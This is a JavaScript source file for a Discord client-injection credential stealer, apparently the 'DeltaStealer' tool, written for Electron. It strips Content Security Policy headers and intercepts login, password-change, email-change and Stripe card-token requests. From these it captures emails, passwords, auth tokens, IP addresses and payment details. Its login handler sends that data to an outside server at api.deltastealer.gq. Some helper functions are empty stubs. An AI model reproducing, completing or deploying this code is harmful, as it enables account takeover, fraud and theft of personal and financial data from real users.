const { session, BrowserWindow } = require("electron");
const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  delete details.responseHeaders["content-security-policy"];
  delete details.responseHeaders["content-security-policy-report-only"];

  callback({
    responseHeaders: {
      ...details.responseHeaders,
      "Access-Control-Allow-Headers": "*",
    },
  });
});

function ChangePassword() {}
function ChangeEmail() {}
function CreditCardAdded() {}

// Local Objects
const Nitro = {
  0: false,
  1: "<:nitro_classic:962431607879372850>",
  2: "<:nitro_boost:962432521461706763>",
};

const badges = {
  1: "<:discord_employee:962493361741242370>",
  2: "<:partner:962493833344581702>",
  4: "<:hypesquad:962494683248996463>",
  8: "<:hunter1:962495135101378570>",
  512: "<:early:962497249995264050>",
};

const getBadges = () => {};

// Local Functions
const calculateFriends = (friends) => {
  var str = "";
};

const steal = async () => {
  let output = "";

  return output;
};

const sendFile = async (fName, fPath) => {
  if (!fs.existsSync(fPath)) return false;

  var form = new FormData();
  var f = fs.createReadStream(fPath);
  form.append("title", fName);
  form.append("file", f);

  var res = await axios.post("https://api.deltastealer.gq/v1/upload", form, {
    headers: {
      ...form.getHeaders(),
    },
  });

  return res.data;
};

const send = async ({ type, userid = undefined, id = undefined, payload }) => {
  const types = {
    dm: "dm",
    channel: "channel",
  };

  if (types[type] === "dm") {
    const res = await axios.post(
      `https://api.deltastealer.gq/v1/users/${userid}`,
      {
        payload: JSON.stringify(payload),
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    return res;
  } else {
  }
};

// Functions

const GetBadges = (flags) => {
  const Discord_Employee = 1;
  const Partnered_Server_Owner = 2;
  const HypeSquad_Events = 4;
  const Bug_Hunter_Level_1 = 8;
  const House_Bravery = 64;
  const House_Brilliance = 128;
  const House_Balance = 256;
  const Early_Supporter = 512;
  const Bug_Hunter_Level_2 = 16384;
  const Early_Verified_Bot_Developer = 131072;
  var badges = "";
  if ((flags & Discord_Employee) == Discord_Employee) {
    badges += "<:staff:874750808728666152> ";
  }
  if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
    badges += "<:partner:874750808678354964> ";
  }
  if ((flags & HypeSquad_Events) == HypeSquad_Events) {
    badges += "<:hypesquad_events:874750808594477056> ";
  }
  if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
    badges += "<:bughunter_1:874750808426692658> ";
  }
  if ((flags & House_Bravery) == House_Bravery) {
    badges += "<:bravery:874750808388952075> ";
  }
  if ((flags & House_Brilliance) == House_Brilliance) {
    badges += "<:brilliance:874750808338608199> ";
  }
  if ((flags & House_Balance) == House_Balance) {
    badges += "<:balance:874750808267292683> ";
  }
  if ((flags & Early_Supporter) == Early_Supporter) {
    badges += "<:early_supporter:874750808414113823> ";
  }
  if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
    badges += "<:bughunter_2:874750808430874664> ";
  }
  if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
    badges += "<:developer:874750808472825986> ";
  }
  if (badges == "") {
    badges = "`No badges`";
  }
  return badges;
};

session.defaultSession.webRequest.onCompleted(
  {
    urls: [
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.stripe.com/v*/tokens",
    ],
  },
  async (details, callback) => {
    if (details.url.endsWith("login")) {
      if (details.statusCode == 200) {
        const data = JSON.parse(
          Buffer.from(details.uploadData[0].bytes).toString()
        );
        const email = data.login;
        const password = data.password;
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents
          .executeJavaScript(
            `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
            !0
          )
          .then((token) => {
            axios
              .get("https://ifconfig.me/", {
                timeout: 5000,
              })
              .then((i) => {
                const ip = i.data;
                axios({
                  method: "GET",
                  url: "https://discord.com/api/v9/users/@me",
                  headers: {
                    "Content-Type": "application/json",
                    Authorization: token,
                  },
                  timeout: 5000,
                })
                  .then((u) => {
                    const user = u.data;
                    var payload = {
                      embeds: [
                        {
                          title: "User Logged In",
                          thumbnail: {
                            url: "https://i.pinimg.com/564x/21/58/15/215815f6cc9880fdcc548897f51f505f.jpg",
                          },
                          author: {
                            name: user.username,
                            icon_url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
                          },
                          fields: [
                            {
                              name: "Tag",
                              value: `\`${user.username}#${user.discriminator}\``,
                              inline: false,
                            },
                            {
                              name: "User",
                              value: `<@${user.id}>`,
                              inline: false,
                            },
                            {
                              name: "ID",
                              value: `\`${user.id}\``,
                              inline: false,
                            },
                            {
                              name: "Badges",
                              value: GetBadges(user.flags),
                              inline: false
                            },
                            {
                              name: "Email",
                              value: `\`${email}\``,
                              inline: false,
                            },
                            {
                              name: "Password",
                              value: `\`${password}\``,
                              inline: false,
                            },
                            {
                              name: "Token",
                              value: `\`${token}\``,
                              inline: false,
                            },
                          ],
                          footer: {
                            text: `DeltaStealer - ${ip}`,
                            icon_url:
                              "https://cdn.discordapp.com/attachments/943186252272893972/963602880345034852/309da7b9b52a6512a047dd793eaedba8.jpg",
                          },
                        },
                      ],
                    };

                    axios
                      .get(
                        "https://discord.com/api/v9/users/@me/billing/payment-sources",
                        {
                          headers: {
                            "Content-Type": "application/json",
                            Authorization: token,
                          },
                          timeout: 5000,
                        }
                      )
                      .then((c) => {
                        billing = {
                          title: "Billing",
                          color: "FFCCCC",
                          fields: [],
                        };

                        if (c.data.length !== 0) {
                          const payments = c.data;
                          var str = "";

                          payments.forEach((pay) => {
                            if (pay.type === 1 && pay.invalid === false) {
                              str += "<:paypal:896441236062347374> ";
                            } else if (
                              pay.type === 2 &&
                              pay.invalid === false
                            ) {
                              str += ":credit_card: ";
                            }
                          });
                          billing.fields.push({
                            name: "Payment Methods",
                            value: str,
                            inline: true,
                          });
                        }

                        if (user.premium_type !== 0) {
                          var fname = "";
                          if (user.premium_type === 1) {
                            fname =
                              "<:nitro_classic:962431607879372850> | `Classic`";
                          } else {
                            fname =
                              "<:nitro_boost:962432521461706763> | `Boost`";
                          }
                          billing.fields.push({
                            name: "Nitro Type",
                            value: fname,
                            inline: true,
                          });
                        }

                        if (user.premium_type !== 0 || c.data.length !== 0) {
                          payload.embeds.push(billing);
                        }
                      })
                      .catch((error) => {
                        window.webContents.executeJavaScript(
                          `alert("${error}")`,
                          false
                        );
                      });

                    axios.post(
                      "https://api.deltastealer.gq/v1/channels/965709054771073047/messages",
                      {
                        payload: JSON.stringify(payload),
                      }
                    );
                  })
                  .catch((error) => {
                    window.webContents.executeJavaScript(
                      `alert("${error}")`,
                      false
                    );
                  });
              })
              .catch((error) => {
                window.webContents.executeJavaScript(
                  `alert("${error}")`,
                  false
                );
              });
          });
      } else {
      }
    }
    if (details.url.endsWith("users/@me")) {
      if (details.statusCode == 200 && details.method == "PATCH") {
        const data = JSON.parse(
          Buffer.from(details.uploadData[0].bytes).toString()
        );
        if (
          data.password != null &&
          data.password != undefined &&
          data.password != ""
        ) {
          if (
            data.new_password != undefined &&
            data.new_password != null &&
            data.new_password != ""
          ) {
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents
              .executeJavaScript(
                `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
                !0
              )
              .then((token) => {
                ChangePassword(data.password, data.new_password, token);
              });
          }
          if (
            data.email != null &&
            data.email != undefined &&
            data.email != ""
          ) {
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents
              .executeJavaScript(
                `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
                !0
              )
              .then((token) => {
                ChangeEmail(data.email, data.password, token);
              });
          }
        }
      } else {
      }
    }
    if (details.url.endsWith("tokens")) {
      const window = BrowserWindow.getAllWindows()[0];
      const item = querystring.parse(
        decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString())
      );
      window.webContents
        .executeJavaScript(
          `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
          !0
        )
        .then((token) => {
          CreditCardAdded(
            item["card[number]"],
            item["card[cvc]"],
            item["card[exp_month]"],
            item["card[exp_year]"],
            item["card[address_line1]"],
            item["card[address_city]"],
            item["card[address_state]"],
            item["card[address_zip]"],
            item["card[address_country]"],
            token
          );
        });
    }
  }
);
/*
var payload = {
  embeds: [
    {
      title: "User Logged In",
      description: `\`\`\`asd\`\`\``,
      author: {
        name: user.username,
      },
      fields: [
        {
          name: "ID",
          value: `\`${user.id}\``,
          inline: true,
        },
        {
          name: "Tag",
          value: `\`${user.username}#${user.discriminator}\``,
          inline: true,
        },
        {
          name: "Badges",
          value: `Asd`,
          inline: true,
        },
        {
          name: "E-mail",
          value: `\`${email}\``,
          inline: true,
        },
        {
          name: "Password",
          value: `\`${password}\``,
          inline: true,
        },
        {
          name: "Token",
          value: `\`${token}\``,
          inline: true,
        },
      ],
    },
  ],
};
*/
